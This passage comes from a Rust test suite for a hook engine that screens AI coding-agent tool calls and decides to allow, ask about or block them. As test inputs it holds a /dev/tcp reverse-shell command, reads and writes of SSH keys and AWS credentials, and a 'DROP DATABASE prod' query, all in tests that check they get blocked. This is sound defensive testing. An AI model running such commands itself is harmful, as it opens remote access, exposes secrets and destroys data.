            "docker run --rm -v $PWD:/src node:20 npm test",
            "cat /etc/passwd | wc -l",
            "python -m pytest",
        ] {
            let r = eval_named("Bash", json!({"command": cmd}), HookDialect::Claude);
            assert!(
                !r.decision.is_blocking(),
                "{cmd}: {:?}",
                r.decision
            );
        }
    }

    #[test]
    fn bash_ls_allows() {
        let report = eval_named(
            "Bash",
            json!({"command": "ls -la src"}),
            HookDialect::Claude,
        );
        assert!(
            !report.decision.is_blocking(),
            "decision={:?}",
            report.decision
        );
        assert_eq!(report.exit_code(), 0);
        assert!(report.stdout.is_empty());
    }

    #[test]
    fn write_ssh_key_blocks() {
        let report = eval_named(
            "Write",
            json!({"path": "~/.ssh/id_rsa", "contents": "-----BEGIN"}),
            HookDialect::Cursor,
        );
        assert!(
            report.decision.is_blocking(),
            "decision={:?}",
            report.decision
        );
        assert!(
            report.stdout.contains("\"permission\":\"ask\"")
                || report.stdout.contains("\"permission\": \"ask\"")
        );
        assert_eq!(report.exit_code(), 0);
        assert!(!report.stdout.contains("hookSpecificOutput"));
    }

    #[test]
    fn write_env_asks_not_denies() {
        let report = eval_named(
            "Write",
            json!({"path": "/tmp/proj/.env", "contents": "AWS_SECRET=x"}),
            HookDialect::Cursor,
        );
        assert!(
            report.decision.is_blocking(),
            "decision={:?} reason={}",
            report.decision,
            report.reason
        );
        assert_eq!(report.exit_code(), 0);
        assert!(
            report.stdout.contains("\"permission\":\"ask\"")
                || report.stdout.contains("\"permission\": \"ask\"")
        );
    }

    #[test]
    fn tab_file_read_of_a_key_asks() {
        let event = HookEvent {
            hook_event_name: Some("beforeTabFileRead".into()),
            file_path: Some("~/.ssh/id_rsa".into()),
            content: Some("-----BEGIN OPENSSH PRIVATE KEY-----".into()),
            ..Default::default()
        };
        let report = run(&engine(), &event, HookDialect::Cursor, None).expect("run");
        assert!(report.decision.is_blocking(), "{:?}", report.decision);
        assert_eq!(report.canonical_tool, "fs.read");
    }

    #[test]
    fn subagent_task_with_a_reverse_shell_is_denied() {
        let event = HookEvent {
            hook_event_name: Some("subagentStart".into()),
            task: Some("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1".into()),
            ..Default::default()
        };
        let report = run(&engine(), &event, HookDialect::Cursor, None).expect("run");
        assert!(
            matches!(report.decision, Decision::Block { .. }),
            "{:?} {}",
            report.decision,
            report.reason
        );
        assert_eq!(report.exit_code(), 2);
    }

    #[test]
    fn plain_subagent_task_is_allowed() {
        let event = HookEvent {
            hook_event_name: Some("subagentStart".into()),
            task: Some("summarize the payments module".into()),
            ..Default::default()
        };
        let report = run(&engine(), &event, HookDialect::Cursor, None).expect("run");
        assert!(matches!(report.decision, Decision::Allow), "{:?} {}", report.decision, report.reason);
    }

    #[test]
    fn shell_event_without_tool_name_still_evaluates() {
        let event = HookEvent {
            hook_event_name: Some("beforeShellExecution".into()),
            command: Some("git reset --hard HEAD~1".into()),
            cwd: Some("/tmp/repo".into()),
            ..Default::default()
        };
        let report = run(&engine(), &event, HookDialect::Cursor, None).expect("run");
        assert!(matches!(report.decision, Decision::Approval { .. }));
        assert_eq!(report.exit_code(), 0);
        assert!(report.stdout.contains("ask"));
    }

    #[test]
    fn read_aws_credentials_escalates() {
        let report = eval_named(
            "Read",
            json!({"path": "~/.aws/credentials"}),
            HookDialect::Claude,
        );
        assert!(
            report.decision.is_blocking(),
            "decision={:?} reason={}",
            report.decision,
            report.reason
        );
    }

    #[test]
    fn mcp_postgres_drop_blocks() {
        let report = eval_named(
            "mcp__postgres__query",
            json!({"query": "DROP DATABASE prod"}),
            HookDialect::Claude,
        );
        assert!(
            report.decision.is_blocking(),
            "decision={:?} canonical={}",
            report.decision,
            report.canonical_tool
        );
    }

    #[test]
    fn offload_gate_denies_large_read_in_both_dialects() {
        use std::io::Write;
        let dir = tempfile::tempdir().unwrap();
        let big = dir.path().join("huge.rs");
        let mut f = std::fs::File::create(&big).unwrap();
        for i in 0..600 {
            writeln!(f, "fn f{i}() {{}}").unwrap();
        }
        let cfg = OffloadConfig { min_lines: 350 };
        let event = HookEvent {
            tool_name: Some("Read".into()),
            tool_input: Some(json!({"file_path": big})),
            cwd: Some(dir.path().display().to_string()),
            ..Default::default()
        };
        let session = crate::session::SessionStore::open(600);
        let claude = run_with_offload(&engine(), &event, HookDialect::Claude, None, &cfg, &session)
            .expect("run");
        assert!(
            matches!(claude.decision, Decision::Block { .. }),
            "{:?}",
            claude.decision
        );
        assert_eq!(claude.primary_rule_id.as_deref(), Some(offload::RULE_ID));
        assert_eq!(claude.exit_code(), 2);
        assert!(claude.stdout.contains("\"permissionDecision\":\"deny\""));
        assert!(claude.stdout.contains("--summarize"));

        let cursor = run_with_offload(&engine(), &event, HookDialect::Cursor, None, &cfg, &session)
            .expect("run");
        assert!(cursor.stdout.contains("\"permission\":\"deny\""));
        assert_eq!(cursor.exit_code(), 2);

        // Same file, targeted read: gate stays out of the way.
        let ranged = HookEvent {
            tool_input: Some(json!({"file_path": big, "offset": 10, "limit": 50})),
            ..event.clone()
        };
        let ok = run_with_offload(
            &engine(),
            &ranged,
            HookDialect::Claude,
            None,
            &cfg,
            &session,
        )
        .expect("run");
        assert!(matches!(ok.decision, Decision::Allow), "{:?}", ok.decision);

        // Disabled config: plain allow.
        let off = run_with_offload(
            &engine(),
            &event,
            HookDialect::Claude,
            None,
            &OffloadConfig::disabled(),
            &session,
        )
        .expect("run");
        assert!(matches!(off.decision, Decision::Allow));
    }

    #[test]
    fn detect_dialect_prefers_claude_pascal_case() {
        let event = HookEvent {
            hook_event_name: Some("PreToolUse".into()),
            tool_name: Some("Bash".into()),
            ..Default::default()
        };
        assert_eq!(detect_dialect(&event), HookDialect::Claude);
    }

    #[test]
    fn detect_dialect_cursor_when_event_name_missing() {
        let event = HookEvent {
            tool_name: Some("Shell".into()),
            ..Default::default()
        };
        assert_eq!(detect_dialect(&event), HookDialect::Cursor);
    }

    #[test]
    fn host_is_cursor_for_claude_format_hooks_run_by_cursor() {
        let raw = r#"{"hook_event_name":"PreToolUse","tool_name":"Bash","cursor_version":"3.1.0"}"#;
        assert_eq!(host_from(raw, HookDialect::Claude, false), "cursor");
        let bare = r#"{"hook_event_name":"PreToolUse","tool_name":"Bash"}"#;
        assert_eq!(host_from(bare, HookDialect::Claude, true), "cursor");
    }

    #[test]
    fn cursor_file_read_turns_ask_into_deny() {
        let ask = Decision::Approval {
            rule_id: "r".into(),
            severity: Severity::High,
            reason: "why".into(),
            safer_alternative: None,
            contributing_rules: Vec::new(),
        };
        assert!(!event_can_ask(Some("beforeReadFile")));
        assert!(!event_can_ask(Some("beforeTabFileRead")));
        assert!(event_can_ask(Some("preToolUse")));
        assert!(event_can_ask(None));

        let held = hold_ask(None, false, ask.clone());
        assert!(matches!(held, Decision::Block { .. }));
        let out = render_stdout(HookDialect::Cursor, &held, &decision_reason(&held), Some("r"));
        assert!(out.contains("\"permission\":\"deny\""), "{out}");
        assert!(out.contains("file read"), "{out}");

        assert!(matches!(hold_ask(None, true, ask), Decision::Approval { .. }));
    }

    #[test]
    fn host_is_claude_for_claude_code() {
        let raw = r#"{"hook_event_name":"PreToolUse","tool_name":"Bash","session_id":"s1"}"#;
        assert_eq!(host_from(raw, HookDialect::Claude, false), "claude");
        assert_eq!(host_from("not json", HookDialect::Claude, false), "claude");
        assert_eq!(host_from(raw, HookDialect::Cursor, false), "cursor");
    }

    #[test]
    fn parse_event_accepts_aliases() {
        let raw =
            r#"{"toolName":"Bash","toolInput":{"command":"pwd"},"hookEventName":"preToolUse"}"#;
        let event = HookEvent::from_json(raw).unwrap();
        assert_eq!(event.tool_name(), "Bash");
        assert_eq!(event.input()["command"], "pwd");
    }

    #[test]
    fn parse_event_accepts_duplicate_conversation_id_names() {
        let raw = r#"{"hook_event_name":"beforeShellExecution","command":"echo hi","conversation_id":"conv-1","conversationId":"conv-1","session_id":"conv-1"}"#;
        let event = HookEvent::from_json(raw).unwrap();
        assert_eq!(event.command.as_deref(), Some("echo hi"));
        assert_eq!(event.conversation_id.as_deref(), Some("conv-1"));
    }
}
